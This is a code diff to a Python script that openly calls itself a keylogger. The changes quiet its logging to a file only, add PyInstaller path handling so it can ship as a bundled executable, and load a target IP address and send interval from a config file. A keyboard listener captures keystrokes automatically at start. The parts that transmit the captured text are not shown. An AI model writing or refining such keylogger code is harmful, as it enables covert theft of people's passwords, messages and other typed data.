@@ -6,17 +6,22 @@ import threading
 import logging
 import os
 import signal
+import sys
 
 # Configure logging
 logging.basicConfig(
+    filename="keylogger.log",
     level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-    handlers=[logging.FileHandler("keylogger.log"), logging.StreamHandler()]
+    format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
-# Load configuration from config.json
-config_path = os.path.join(os.path.dirname(__file__), "config.json")
+# Locate the configuration file
 try:
+    # Determine the base path (handles PyInstaller's temp directory)
+    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    config_path = os.path.join(base_path, "config.json")
+    
+    # Load the configuration
     with open(config_path, "r") as config_file:
         config = json.load(config_file)
     ip_address = config["ip_address"]  # Correctly read IP address
@@ -24,7 +29,7 @@ try:
     time_interval = config["time_interval"]  # Correctly read time interval
 except (FileNotFoundError, KeyError, json.JSONDecodeError) as e:
     logging.error(f"Error loading configuration: {e}")
-    raise SystemExit("Failed to load configuration. Ensure config.json is properly set up.")
+    exit(1)
 
 # Global variables
 text = ""
@@ -96,7 +101,7 @@ def on_press(key):
 
 if __name__ == "__main__":
     # Automatically start capturing keystrokes
-    logging.info("Keylogger started automatically.")
+    logging.info("Keylogger started.")
     try:
         # Start the keyboard listener
         with keyboard.Listener(on_press=on_press) as listener:
